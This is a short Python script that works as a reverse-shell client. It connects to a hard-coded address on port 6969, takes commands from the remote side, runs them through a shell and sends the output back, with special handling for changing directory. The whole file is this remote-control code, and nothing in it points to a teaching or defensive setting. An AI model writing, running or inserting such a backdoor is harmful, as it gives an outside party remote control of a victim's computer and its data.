import socket
import os
import subprocess


def client():
    host = "192.168.1.7"
    port = 6969

    s = socket.socket()
    s.connect((host, port))
    while True:
        data = s.recv(1024)

        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            output = str((cmd.stdout.read() + cmd.stderr.read()), "utf-8")
            current_dir = os.getcwd() + "> "
            s.send(str.encode(output + current_dir))

            print(output)


if __name__ == '__main__':
    client()
